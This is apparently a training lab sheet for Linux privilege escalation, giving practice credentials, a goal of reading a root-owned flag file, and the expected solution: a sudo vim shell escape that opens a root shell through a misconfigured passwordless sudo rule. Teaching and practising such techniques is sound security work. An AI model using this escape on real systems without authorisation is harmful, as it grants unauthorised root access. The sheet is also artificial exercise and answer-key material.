# Linux Privilege Escalation Lab

Credentials: student / student

Goal: escalate to root and read `/root/flag.txt`.

Expected path:

```bash
sudo -l
sudo vim -c ':!/bin/bash'
cat /root/flag.txt
```

Vulnerability: the student user can run `/usr/bin/vim` as root without a password.
